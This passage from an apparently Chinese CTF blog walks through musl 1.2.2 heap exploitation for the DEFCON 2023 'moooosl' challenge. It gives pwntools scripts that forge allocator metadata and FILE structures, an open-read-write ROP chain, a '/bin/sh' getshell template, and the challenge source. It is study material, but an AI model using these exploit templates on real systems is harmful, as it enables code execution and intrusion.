class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure><h3 id="puts利用链"><a href="#puts利用链" class="headerlink" title="puts利用链"></a>puts利用链</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">puts</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s)</span> &#123;</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line">    FLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    r = -(<span class="built_in">fputs</span>(s, <span class="built_in">stdout</span>) &lt; <span class="number">0</span> || putc_unlocked(<span class="string">&#x27;\n&#x27;</span>, <span class="built_in">stdout</span>) &lt; <span class="number">0</span>);</span><br><span class="line">    FUNLOCK(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fputs</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> l = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">return</span> (fwrite(s, <span class="number">1</span>, l, f) == l) - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">fwrite</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *<span class="keyword">restrict</span> src, <span class="type">size_t</span> size, <span class="type">size_t</span> nmemb, FILE *<span class="keyword">restrict</span> f)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> k, l = size * nmemb;</span><br><span class="line">    <span class="keyword">if</span> (!size) nmemb = <span class="number">0</span>;</span><br><span class="line">    FLOCK(f);</span><br><span class="line">    k = __fwritex(src, l, f);</span><br><span class="line">    FUNLOCK(f);</span><br><span class="line">    <span class="keyword">return</span> k == l ? nmemb : k / size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __towrite(FILE *f) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;flags &amp; F_NOWR) &#123;</span><br><span class="line">        f-&gt;flags |= F_ERR;</span><br><span class="line">        <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> __fwritex(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *<span class="keyword">restrict</span> s, <span class="type">size_t</span> l, FILE *<span class="keyword">restrict</span> f) &#123;</span><br><span class="line">    <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!f-&gt;wend &amp;&amp; __towrite(f)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (l &gt; f-&gt;wend - f-&gt;wpos) <span class="keyword">return</span> f-&gt;write(f, s, l);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getshell 模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>orw musl-1.2.2 模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">fake_name_addr = libc.address + <span class="number">0xb7990</span></span><br><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(fake_name_addr)  <span class="comment"># name_addr</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># content_addr</span></span><br><span class="line">fake_node += p64(<span class="built_in">len</span>(<span class="string">&#x27;fake name&#x27;</span>))  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># content_size</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># next</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">&#x27;hijack node&#x27;</span>.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>), fake_node)</span><br><span class="line">add(<span class="string">&quot;payload&quot;</span>, payload)</span><br><span class="line">log.info(<span class="string">&quot;fake chunk addr: &quot;</span> + <span class="built_in">hex</span>(fake_chunk_addr))</span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目为<code>defcon 2023 moooosl</code><br>musl版本为1.2.2</p><h3 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h3><p>赛题好像没有给出源码，不过代码比较简单，<code>ida</code>看的反而比源码更加方便，这里为了方便看的人了解题目，就把源码贴出来了<br>h.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">uint32_t</span> <span class="title function_">key_hash</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">size_t</span> key_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint64_t</span> h = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; key_size; i++) &#123;</span><br><span class="line">        h = h * <span class="number">0x13377331</span> + key[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> H[<span class="number">0x100000</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="type">uint32_t</span> shift = rand();</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> L 0x40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> R 0x7f</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">char</span> a = L; a &lt; R; a++) &#123;</span><br><span class="line">        tmp[<span class="number">0</span>] = a;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> b = L; b &lt; R; b++) &#123;</span><br><span class="line">            tmp[<span class="number">1</span>] = b;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c = L; c &lt; R; c++) &#123;</span><br><span class="line">                tmp[<span class="number">2</span>] = c;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">char</span> d = L; d &lt; R; d++) &#123;</span><br><span class="line">                    tmp[<span class="number">3</span>] = d;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">char</span> e = L; e &lt; R; e++) &#123;</span><br><span class="line">                        tmp[<span class="number">4</span>] = e;</span><br><span class="line">                        <span class="type">uint32_t</span> h = key_hash(&amp;tmp, <span class="number">5</span>) - shift;</span><br><span class="line">                        <span class="keyword">if</span> (h &lt; <span class="number">0x100000</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (H[h] == <span class="number">0</span>) &#123;</span><br><span class="line">                                H[h] = *(<span class="type">uint64_t</span> *)&amp;tmp;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="built_in">printf</span>(<span class="string">&quot;%s %s =&gt; %#08x\n&quot;</span>, tmp, &amp;H[h], h);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>service.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span 